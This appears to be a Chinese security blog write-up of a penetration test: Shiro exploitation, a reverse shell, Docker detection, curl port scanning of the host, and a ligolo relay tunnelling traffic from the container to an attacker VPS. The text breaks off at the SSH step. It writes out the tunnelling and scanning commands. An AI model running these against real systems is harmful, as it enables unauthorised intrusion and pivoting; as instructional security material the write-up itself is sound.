<html>
<head>
<title>记一次逃逸Docker的渗透测试</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
记一次逃逸Docker的渗透测试
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    雷石安全实验室
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2020-10-16</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><section data-mpa-template="t" mpa-from-tpl="t" data-mpa-powered-by="yiban.io"><section style="display: flex;justify-content: center;align-items: center;width: 100%;padding: 10px;" data-mid="" mpa-from-tpl="t"><section style="display: flex;justify-content: flex-start;align-items: center;flex-direction: column;" data-mid="" mpa-from-tpl="t"><section style="width: 20px;height: 33px;align-self: flex-start;margin-bottom: -36.1px;margin-left: 2px;z-index: 1;" data-mid="" mpa-from-tpl="t"><img data-ratio="1.6097560975609757" data-type="png" data-w="82" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/1_NQQV5R5ZvJ97cBS9OY8vEhlEwhyqPg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/0fwWib0uAxkLXkkeCw3wrNGUOUicDRle5OQftoX4ib03wNZAXNtAMaLicJ7rNQQV5R5ZvJ97cBS9OY8vEhlEwhyqPg/640?wx_fmt=png'"  /></section><section style="border-width: 2px;border-style: solid;border-color: rgb(252, 248, 167);border-radius: 8px;" data-mid="" mpa-from-tpl="t"><section data-mid="" mpa-from-tpl="t" style="text-align: center;background-image: url(&quot;https://mmbiz.qpic.cn/mmbiz_png/lyPKRvR4V8Q4bbQOHnUZZuqDAXz9jBK4LvAMSadPkOnUt4vWHOz5NhDdic1rMoLrSjGXCWI0oArIkTAksfc28hw/640?wx_fmt=png&quot;);background-size: 100% 100%;padding: 10px 20px;border-radius: 8px;"><p style="font-size:16px;line-height:36px;;font family: PingFangSC-Medium, PingFang SC;font-weight: bold;color: #FCF8A7;line-height: 16px;" data-mid="" mpa-is-content="t">Shiro漏洞利用</p></section></section><section style="width: 44px;height: 31px;align-self: flex-end;margin-top: -36.1px;" data-mid="" mpa-from-tpl="t"><img data-ratio="0.7126436781609196" data-type="png" data-w="174" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/2_dyiacWPDFWibibafwz4RyCclFje8YA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3n7VQRz6w55cupvOM5odibMKicQP1zYeBKTWiadBWTEN0Tx4WWF8Mbp4x7e9BydyiacWPDFWibibafwz4RyCclFje8YA/640?wx_fmt=png'"  /></section></section></section></section><p><br mpa-from-tpl="t"  /></p><h2 style="font family: 17px 0;line-height: 36.9067px;break-after: avoid;font-size:21px;line-height:41px;;font family: Cambria, serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font-size:14px;line-height:34px;;font family: 宋体;">该网站页面存在</span><span style="font family: Calibri, sans-serif;font-size:14px;line-height:34px;;">Remember me</span><span style="font-size:14px;line-height:34px;;font family: 宋体;">，大概率是</span><span style="font family: Calibri, sans-serif;font-size:14px;line-height:34px;;">shiro</span><br  /></a></h2><p style="text-align: center;"><img class="rich_pages" data-cropselx1="1" data-cropselx2="416" data-cropsely1="0" data-cropsely2="241" data-ratio="0.5793269230769231" data-s="300,640" data-type="png" data-w="832" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/3_v5FpxKHF3BOaMaMxk9xLyjVmicKB0A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTz43T0AQLz0DGBdghobIJibhKWRHv5FpxKHF3BOaMaMxk9xLyjVmicKB0A/640?wx_fmt=png'" style="width: 416px;height: 241px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;"></span>由于这个环境并不稳定，请求多了就卡住（自带防御属性啊～）</p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">https://github.com/tangxiaofeng7/Shiroexploit<span style="font family: 宋体;"></span></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;"></span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="344" data-cropsely1="0" data-cropsely2="296" data-ratio="0.8604651162790697" data-s="300,640" data-type="png" data-w="688" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/4_xgLhpOHkTRxniaEkObQfqOH9yre1wA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzvgsEQ8dPPPovg62524FuqaqibNxgLhpOHkTRxniaEkObQfqOH9yre1wA/640?wx_fmt=png'" style="width: 344px;height: 296px;"  /><span style="color: rgb(0, 0, 0);font family: Calibri, sans-serif;font-size:14px;line-height:34px;;text-align: justify;">&nbsp;</span></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">判断可以出网后把</span>shell<span style="font family: 宋体;">反弹到</span>vps<span style="font family: 宋体;">上：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="343" data-cropsely1="0" data-cropsely2="386" data-ratio="1.1282798833819243" data-s="300,640" data-type="png" data-w="686" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/5_hJAWgBeMVpT7ibdnibSgcsTGLibiaw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzmxILKibt0ZjKrRpRp5yFUx3icrSuSZhJAWgBeMVpT7ibdnibSgcsTGLibiaw/640?wx_fmt=png'" style="width: 343px;height: 387px;"  /></p><h2 style="font family: 17px 0;line-height: 36.9067px;break-after: avoid;font-size:21px;line-height:41px;;font family: Cambria, serif;color: rgb(0, 0, 0);white-space: normal;"><br mpa-from-tpl="t"  /></h2><p><br  /></p><section data-mpa-template="t" mpa-from-tpl="t"><section style="display: flex;justify-content: center;align-items: center;width: 100%;padding: 10px;" data-mid="" mpa-from-tpl="t"><section style="display: flex;justify-content: flex-start;align-items: center;flex-direction: column;" data-mid="" mpa-from-tpl="t"><section style="width: 20px;height: 33px;align-self: flex-start;margin-bottom: -36.1px;margin-left: 2px;z-index: 1;" data-mid="" mpa-from-tpl="t"><img data-ratio="1.6097560975609757" data-type="png" data-w="82" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/6_NQQV5R5ZvJ97cBS9OY8vEhlEwhyqPg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/0fwWib0uAxkLXkkeCw3wrNGUOUicDRle5OQftoX4ib03wNZAXNtAMaLicJ7rNQQV5R5ZvJ97cBS9OY8vEhlEwhyqPg/640?wx_fmt=png'"  /></section><section style="border-width: 2px;border-style: solid;border-color: rgb(252, 248, 167);border-radius: 8px;" data-mid="" mpa-from-tpl="t"><section data-mid="" mpa-from-tpl="t" style="text-align: center;background-image: url(&quot;https://mmbiz.qpic.cn/mmbiz_png/lyPKRvR4V8Q4bbQOHnUZZuqDAXz9jBK4LvAMSadPkOnUt4vWHOz5NhDdic1rMoLrSjGXCWI0oArIkTAksfc28hw/640?wx_fmt=png&quot;);background-size: 100% 100%;padding: 10px 20px;border-radius: 8px;"><p style="font-size:16px;line-height:36px;;font family: PingFangSC-Medium, PingFang SC;font-weight: bold;color: #FCF8A7;line-height: 16px;" data-mid="" mpa-is-content="t">Docker检测与逃逸</p></section></section><section style="width: 44px;height: 31px;align-self: flex-end;margin-top: -36.1px;" data-mid="" mpa-from-tpl="t"><img data-ratio="0.7126436781609196" data-type="png" data-w="174" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/7_dyiacWPDFWibibafwz4RyCclFje8YA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3n7VQRz6w55cupvOM5odibMKicQP1zYeBKTWiadBWTEN0Tx4WWF8Mbp4x7e9BydyiacWPDFWibibafwz4RyCclFje8YA/640?wx_fmt=png'"  /></section></section></section></section><p><br mpa-from-tpl="t"  /></p><h2 style="font family: 17px 0;line-height: 36.9067px;break-after: avoid;font-size:21px;line-height:41px;;font family: Cambria, serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;"></span><br  /></h2><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">然后查看一些信息的时候发现命令找不到：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="101" data-ratio="0.2433734939759036" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/8_DIJuibic61It44P7naDqjqWNIeO5JA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzNOtu9ebFNF7fHZm4RDp3qwbrF2DIJuibic61It44P7naDqjqWNIeO5JA/640?wx_fmt=png'" style="width: 415px;height: 101px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">执行命令验证是否为</span>docker<span style="font family: 宋体;">环境：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="157" data-ratio="0.3783132530120482" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/9_xhFkiavBKUoTEWf9Mk1jjl8L00Zkuw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzvawHnzRbiciaj4RzKMeNpeuWEJCxhFkiavBKUoTEWf9Mk1jjl8L00Zkuw/640?wx_fmt=png'" style="width: 415px;height: 157px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">确实为</span>docker<span style="font family: 宋体;">环境，那么就看看宿主机有没有什么漏洞可以利用，使用</span> cat /etc/hosts,<span style="font family: 宋体;">看到了主机</span>IP<span style="font family: 宋体;">为</span> 192.168.16.2<span style="font family: 宋体;">：</span><br  /></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="105" data-ratio="0.25542168674698795" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/10_dLOIyqOEjAs59ibz6OVvoM4GkrDfXA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzrblg5x4fAhEYCPZ9wqOibwEpSIdLOIyqOEjAs59ibz6OVvoM4GkrDfXA/640?wx_fmt=png'" style="width: 415px;height: 106px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">到这里本来想代理流量本地开工具扫扫的，想想还是试试其他的方法来玩玩，那么这里先循环</span>ping<span style="font family: 宋体;">一下</span>C<span style="font family: 宋体;">段检测存活</span>IP<span style="font family: 宋体;">，在这里找到了一个脚本</span>(<span style="color: black;">https://blog.csdn.net/qq_38228830/article/details/81356984</span>)<span style="font family: 宋体;">，把工具下载到</span>docker<span style="font family: 宋体;">里：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="1" data-cropselx2="416" data-cropsely1="0" data-cropsely2="93" data-ratio="0.22355769230769232" data-s="300,640" data-type="png" data-w="832" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/11_aqGyXD7D4S9kW1noISoZE3GbN4yNOg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTz9SbbWY4ibibZzM2VlmkbF8wdXZiaqGyXD7D4S9kW1noISoZE3GbN4yNOg/640?wx_fmt=png'" style="width: 416px;height: 93px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">探测</span>IP:</p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="155" data-ratio="0.375" data-s="300,640" data-type="png" data-w="832" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/12_gpREmnMT7nkf1VTHfDU6xGGyO6faMg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzeCqSOwQVedgfdDr3bfNFPmSDgpREmnMT7nkf1VTHfDU6xGGyO6faMg/640?wx_fmt=png'" style="width: 415px;height: 156px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">发现个</span>192.168.16.1<span style="font family: 宋体;">，那这个肯定是宿主机了，接下来，探测下宿主机的端口啊</span>~~<span style="font family: 宋体;">，这里嘛就用</span>curl<span style="font family: 宋体;">来探测端口：</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="nginx"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">curl</span> http://192.168.16.1:[1-100] <span class="code-snippet__number">1</span>&gt; <span class="code-snippet__number">1</span>.txt <span class="code-snippet__number">2</span>&gt;/dev/null</span></code><code><span class="code-snippet_outer">curl http://192.168.16.1:[8000-9999] <span class="code-snippet__number">1</span>&gt;&gt; <span class="code-snippet__number">1</span>.txt <span class="code-snippet__number">2</span>&gt;/dev/null</span></code></pre></section><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="140" data-ratio="0.3373493975903614" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/13_e6BIOX3p8SRP27dPRDZRtiaSPSEZEQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzyf3ia1pE5MKyCZjqGw0c1Qgahde6BIOX3p8SRP27dPRDZRtiaSPSEZEQ/640?wx_fmt=png'" style="width: 415px;height: 140px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">命令执行完了查看文件发现两个端口开着服务，一个是</span>SSH<span style="font family: 宋体;">：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="87" data-ratio="0.20963855421686747" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/14_Y8bibx9QZgBOmSdJok5AGDYL3ZkcAA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzrcNTru8Rd5X2Q07kSSURzrO3mY8bibx9QZgBOmSdJok5AGDYL3ZkcAA/640?wx_fmt=png'" style="width: 415px;height: 87px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">一个是</span>9000<span style="font family: 宋体;">端口的</span>Portainer<span style="font family: 宋体;">面板：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="145" data-ratio="0.3493975903614458" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/15_Sfv159cZUhUEeWxtJMuPwTuiaTrcag.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTz96Tiaw57uF6DxxueX2RjtopHWDSfv159cZUhUEeWxtJMuPwTuiaTrcag/640?wx_fmt=png'" style="width: 415px;height: 145px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">那么思路来了，要么爆破进行</span>SSH<span style="font family: 宋体;">，要么爆破进</span>Portainer<span style="font family: 宋体;">，接下来可以上代理了，继续用</span>wget<span style="font family: 宋体;">下载到</span>docker<span style="font family: 宋体;">里：</span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="171" data-ratio="0.41445783132530123" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/16_ZVLV0oibZDuZsyiael1ibcjygxG0NQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzXtMMalzR0aqlb7nx69IXS9nibiaoHZVLV0oibZDuZsyiael1ibcjygxG0NQ/640?wx_fmt=png'" style="width: 415px;height: 172px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">Docker<span style="font family: 宋体;">上执行:</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">chmod</span> +<span class="code-snippet__selector-tag">x</span> <span class="code-snippet__selector-tag">ligolo_linux_amd64</span> &amp;&amp; <span class="code-snippet__selector-tag">ligolo_linux_amd64</span> <span class="code-snippet__selector-tag">-autorestart</span> <span class="code-snippet__selector-tag">-relayserver</span> 122.*.*.*<span class="code-snippet__selector-pseudo">:88</span></span></code></pre></section><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">VPS<span style="font family: 宋体;">上执行</span>:<span style="font family: 宋体;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer">localrelay_windows_amd64.exe -localserver 0.0.0.0:103 -relayserver=0.0.0.0:88</span></code></pre></section><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;">&nbsp;88<span style="font family: 宋体;">端口用于</span>docker<span style="font family: 宋体;">和</span>vps<span style="font family: 宋体;">通信，</span>103<span style="font family: 宋体;">端口用于开放</span>socks<span style="font family: 宋体;">代理。接下来用</span>Proxifier<span style="font family: 宋体;">设置代理了，先看看</span>Portainer<span style="font family: 宋体;">能不能访问：</span></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;"></span></p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="216" data-ratio="0.5204819277108433" data-s="300,640" data-type="png" data-w="830" src="图片/HACK学习呀_2020-10-16_记一次逃逸Docker的渗透测试/17_Ig2THUTDqYY25iaicOiaf8icO8cMtQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzQMyzr1Tw9T9mc9j0GMtaWVxAiayO5Ig2THUTDqYY25iaicOiaf8icO8cMtQ/640?wx_fmt=png'" style="width: 415px;height: 216px;"  /></p><p style="font-size:14px;line-height:34px;;font family: Calibri, sans-serif;color: rgb(0, 0, 0);white-space: normal;"><span style="font family: 宋体;">链接</span>SSH:</p><p style="text-align: center;"><img class="rich_pages" data-cropselx1="0" data-cropselx2="415" data-cropsely1="0" data-cropsely2="264" data-ratio="0.6370192307692307" data-s="300,640" data-type="png" data-w="832" 